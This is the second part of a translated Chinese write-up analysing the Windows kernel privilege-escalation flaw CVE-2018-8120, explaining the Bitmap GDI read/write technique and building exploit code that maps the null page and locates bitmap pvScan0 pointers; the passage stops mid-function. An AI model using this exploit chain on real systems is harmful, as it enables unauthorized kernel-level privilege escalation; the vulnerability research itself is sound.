# Windows内核提权漏洞CVE-2018-8120分析 - 下
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
前文再续，书接上一回[《Windows内核提权漏洞CVE-2018-8120的分析·上》](https://www.anquanke.com/post/id/241057)
## 一、Bitmap GDI技术
BitmapGDI技术，是指通过Bitmap对象信息泄露漏洞，衍生出的一种内核内存污染技术，据了解，Bitmap对象信息漏洞最早由国外安全研究员 Cesar
Cerrudo
于2004年报告至微软，而真正公布的时间是在2006年的11月，至到2015年经安全研究人员于社区分享发布，因可以用作将内核任意写漏洞转换为内核任意读写漏洞而渐入眼帘。
**（一）原理**
用户态程序使用CreateBitmap函数创建得到的Bitmap对象的成员结构中，有存在于内核空间中的成员指针变量pvScan0，而该指针变量可以在用户态下，通过调用GetBitmaps以及SetBitmaps方法，对pvScan0指向的内存地址进行读取和写入。
因此，如果通过内核写漏洞修改指针变量pvScan0，我们就可以在用户态下通过Set\GetBitmaps方法，对内核空间进行读取和写入，最终将内核任意写漏洞，转化为内核任意读写漏洞。
**（二）指针变量pvScan0在哪？**
当程序调用了CreateBitmap方法后，程序的进程环境控制块（PEB）中的GdiSharedHandleTable表便增加了一个索引，该索引对象的结构为：
    typedef struct _GDICELL
    {
        LPVOID pKernelAddress;
        USHORT wProcessId;
        USHORT wCount;
        USHORT wUpper;
        USHORT wType;
        LPVOID pUserAddress;
    } GDICELL;
该对象的pKernelAddress泄露了Bitmap对象的内核地址，继续来看pKernelAddress指向的数据结构：
    typedefstruct {
    BASEOBJECT BaseObject; //0x00
    SURFOBJ SurOBJ; //0x18
    }
    typedef struct _BASEOBJECT {
        HANDLE    hHmgr; 0x04
        PVOID     pEntry; 0x08
        LONG      cExclusiveLock; 0x0d
        PW32THREAD Tid;0x10
    } BASEOBJECT, *POBJ;
    typedef struct _SURFOBJ {
        DHSURF dhsurf;       0x04
        HSURF  hsurf;         0x08
        DHPDEV dhpdev;        0x09
        HDEV   hdev;          0x0a
        SIZEL  sizlBitmap;    0x0e
        ULONG  cjBits;        0x12
        PVOID  pvBits;        0x16
        PVOID  pvScan0;       0x20
        LONG   lDelta;        0x24
        ULONG  iUniq;        0x28
        ULONG  iBitmapFormat; 0x2c
        USHORT iType;        0x2e
        USHORT fjBitmap;      0x30
    } SURFOBJ
于是，我们可以了解到，在32位系统下，通过GDICELL->pKernelAddress +
0x30（在64位系统下是0x50，具体计算成员变量指针所占字节），即可得到指向pvScan0指针的偏移量。
**(三）如何利用漏洞来更改pvScan0指针？**
首先，创建2个Bitmap对象，姑且称其分别为Work、Manager。第一张图，是未修改前的初始状态。
下图，是使用内核任意写漏洞，将Manager的pvScan0指针改写过后的状态，逻辑可能需要反复理解。
将WorkPvScan0在pKernelAddress中的偏移量写入到Manager的PvScan0，至此Manager的PvScan0指针更改为指向WorkPvScan0的指针。通过对ManagerBitmap对象做SetBitmaps操作，可以设置Work的PvScan0指针的值，进而指向任意地址。
随后再通过对WokerBitmap对象做Set\GetBitmaps操作，完成内核读写。
## 二、利用NtUserSetImeInfoEx漏洞
**（一）回顾漏洞代码逻辑**
再次回顾，导致任意写漏洞的代码逻辑路径。
GetProcessWindowStation得到tagWindowStation对象，其结构为：
    kd> dt tagwindowstation
    win32k!tagWINDOWSTATION
       +0x000 dwSessionId     : Uint4B
       +0x004 rpwinstaNext    : Ptr32 tagWINDOWSTATION
       +0x008 rpdeskList      : Ptr32 tagDESKTOP
       +0x00c pTerm           : Ptr32 tagTERMINAL
       +0x010 dwWSF_Flags     : Uint4B
       +0x014 spklList        : Ptr32 tagKL
       +0x018 ptiClipLock     : Ptr32 tagTHREADINFO
       +0x01c ptiDrawingClipboard : Ptr32 tagTHREADINFO
       +0x020 spwndClipOpen   : Ptr32 tagWND
       +0x024 spwndClipViewer : Ptr32 tagWND
       +0x028 spwndClipOwner  : Ptr32 tagWND
       +0x02c pClipBase       : Ptr32 tagCLIP
       +0x030 cNumClipFormats : Uint4B
       +0x034 iClipSerialNumber : Uint4B
       +0x038 iClipSequenceNumber : Uint4B
       +0x03c spwndClipboardListener : Ptr32 tagWND
       +0x040 pGlobalAtomTable : Ptr32 Void
       +0x044 luidEndSession  : _LUID
       +0x04c luidUser        : _LUID
       +0x054 psidUser        : Ptr32 Void
因此，a1为tagWindowStation对象，V3为tagWindowStation->spklList，spklList对象的结构为：
    kd> dt win32k!tagKL
       +0x000 head            : _HEAD
       +0x008 pklNext         : Ptr32 tagKL
       +0x00c pklPrev         : Ptr32 tagKL
       +0x010 dwKL_Flags      : Uint4B
       +0x014 hkl             : Ptr32 HKL__
       +0x018 spkf            : Ptr32 tagKBDFILE
       +0x01c spkfPrimary     : Ptr32 tagKBDFILE
       +0x020 dwFontSigs      : Uint4B
       +0x024 iBaseCharset    : Uint4B
       +0x028 CodePage        : Uint2B
       +0x02a wchDiacritic    : Wchar
       +0x02c piiex           : Ptr32 tagIMEINFOEX
       +0x030 uNumTbl         : Uint4B
       +0x034 pspkfExtra      : Ptr32 Ptr32 tagKBDFILE
       +0x038 dwLastKbdType   : Uint4B
       +0x03c dwLastKbdSubType : Uint4B
       +0x040 dwKLID          : Uint4B
v3[5]为tagWindowStation->spklList->hkl，最后v3[11]为tagWindowStation->spklList->piiex。代码逻辑可以转化为：
    v3 = tagWindowStation->spklList;
    while ( spklList->hkl != a2[0]){
    ....
    }
    v4 = spklList->piiex;
    if( !v4[18]){
    qmemcpy(v4,a2,348u);
    }
**（二）布局零页构造入参**
假设我们传入NtUserSetImeInfoEx的参数名称为buf，那么我们需令tagwindowstation->spklList->hkl等于
buf[0]，令tagwindowstation->spklList->piiex不为空，令tagwindowstation->spklList->piiex->fLoadFlag不为空，就可以将buf中的数据拷贝到v4指向的地址中，此处v4为tagwindowstation->spklList->piiex。由于tagwindowstation->spklList默认为NULL，等同于从0x00000000（零地址）读起，那么我们首先创建零页。
    //创建零页
    // 定义NtAllocateVirtualMemory函数结构
    typedef NTSTATUS(WINAPI* MyNtAllocate)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );
    void allocateZero(){
    PVOID baseAddr = (PVOID)0x100; //以0x100作为起始地址
    DWORD size = 0x1000; // 分配页面大小为4KB
    MyNtAllocate fun;
    *(FARPROC*)&fun = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (fun == NULL)
    {
    printf("[-] fail to GetAddress");
    exit(-1);
    }
    fun(GetCurrentProcess(), &baseAddr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);//分配内存空间
    printf("success to allocate Zero Page!\n");
    }
分别创建Work、Manager的bitmap对象，并计算得到偏移量，为了更改Manager的pvScan0为Worker的pvScan0偏移量，就要使v4为Manager的pvScan偏移量，a2[0]为Wokerpvscan0对象偏移量，于是，要在零页构造要被读取的数据（留意这里pvScan0跟pvScan0的偏移量不一样，pvScan0的偏移量保存的是pvScan0指针的地址，而pvScan0指针，保存的是另一数据的地址）
    unsigned int bbuf[0x60] = { 0x90 };
    HANDLE gManger = CreateBitmap(0x60, 1, 1, 32, bbuf);
    HANDLE gWorker = CreateBitmap(0x60, 1, 1, 32, bbuf);
    DWORD getpeb()
    {
    //读取fs寄存器偏移量0x30,即为PEB
    DWORD p = (DWORD)__readfsdword(0x30);
    return p;
    }
    DWORD gTableOffset = 0x094;
    DWORD getgdi()
    {
    return *(DWORD*)(getpeb() + gTableOffset);
    }
    DWORD gtable;
    PVOID getpvscan0(HANDLE h)
    {
    if (!gtable)
    gtable = getgdi();